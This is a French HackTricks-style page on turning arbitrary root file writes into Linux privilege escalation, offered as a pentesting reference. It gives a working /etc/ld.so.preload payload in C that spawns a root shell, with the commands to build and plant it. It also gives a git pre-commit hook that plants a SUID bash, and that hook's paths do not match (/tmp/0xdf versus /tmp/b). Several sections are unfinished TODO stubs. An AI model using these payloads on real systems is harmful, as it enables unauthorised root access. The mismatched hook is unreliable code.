# Écriture de fichiers arbitraires en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`**, mais il fonctionne également dans les **binaires SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement ajouter un **chemin vers une bibliothèque qui sera chargée** avec chaque binaire exécuté.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de divers **événements** dans un dépôt git, comme lorsqu'un commit est créé, une fusion... Donc, si un **script ou utilisateur privilégié** effectue ces actions fréquemment et qu'il est possible de **écrire dans le dossier `.git`**, cela peut être utilisé pour **privesc**.

Par exemple, il est possible de **générer un script** dans un dépôt git dans **`.git/hooks`** afin qu'il soit toujours exécuté lorsqu'un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO : vérifier les exigences pour abuser de cela afin d'exécuter un rev shell lorsqu'un type de fichier commun est ouvert.

{{#include ../../banners/hacktricks-training.md}}
